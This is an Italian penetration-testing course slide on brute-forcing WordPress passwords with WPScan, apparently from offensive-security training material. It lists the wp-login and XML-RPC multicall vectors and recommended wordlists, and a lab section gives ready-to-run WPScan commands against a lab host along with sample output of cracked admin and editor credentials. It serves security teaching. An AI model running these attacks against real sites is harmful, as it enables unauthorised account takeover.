Capitolo 2: WordPress Enumeration

Slide 2.8: Password Brute Force
Teoria: Strategie di Attacco Password

Con gli username identificati, possiamo tentare un attacco alle password. WPScan supporta brute force su wp-login.php e XML-RPC.


Vettori di attacco:

  • /wp-login.php - Login form classico
  • /xmlrpc.php - Multicall (più veloce)

Wordlist consigliate:

  • /usr/share/wordlists/rockyou.txt
  • /usr/share/seclists/Passwords/
  • Wordlist custom basate sul target

Security Insight: Prima di rockyou.txt (14M password), provate sempre wordlist piccole con password comuni: admin, password, 123456, [nome_sito]2024, ecc.

Lab: WPScan Brute Force

Brute Force via wp-login:

┌──(kali㉿kali)-[~] └─$ wpscan --url http://vulnerable-wp.local \ -U admin -P /usr/share/wordlists/rockyou.txt \ --password-attack wp-login -t 20

Brute Force via XML-RPC (più veloce):

└─$ wpscan --url http://vulnerable-wp.local \ -U admin,editor -P passwords.txt \ --password-attack xmlrpc-multicall

Output di successo:

[+] Performing password attack on Xmlrpc Multicall [SUCCESS] - admin / admin123 [SUCCESS] - editor / password2024 All Found: | Username: admin, Password: admin123 | Username: editor, Password: password2024
